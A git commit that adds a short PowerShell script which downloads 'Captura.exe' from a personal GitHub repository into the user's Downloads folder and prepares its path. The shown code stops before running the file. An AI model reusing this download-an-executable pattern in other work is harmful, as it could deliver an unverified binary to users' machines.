e8070f184c77d6ab994221bb1342f313a57ad45b
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-14 11:17:39 +0300

    Create captura.ps1

---
+++ files/captura.ps1
@@ -0,0 +1,16 @@
+$urls = @(
+    "https://github.com/webntdev/webntdev.github.io/raw/main/application/Captura.exe"
+)
+
+$downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
+if (-not (Test-Path -Path $downloadDir)) {
+    New-Item -ItemType Directory -Path $downloadDir
+}
+
+foreach ($url in $urls) {
+    $fileName = [System.IO.Path]::GetFileName($url)
+    $destinationPath = Join-Path -Path $downloadDir -ChildPath $fileName
+    Invoke-WebRequest -Uri $url -OutFile $destinationPath
+}
+
+$exePath = Join-Path -Path $downloadDir -ChildPath "Captura.exe"
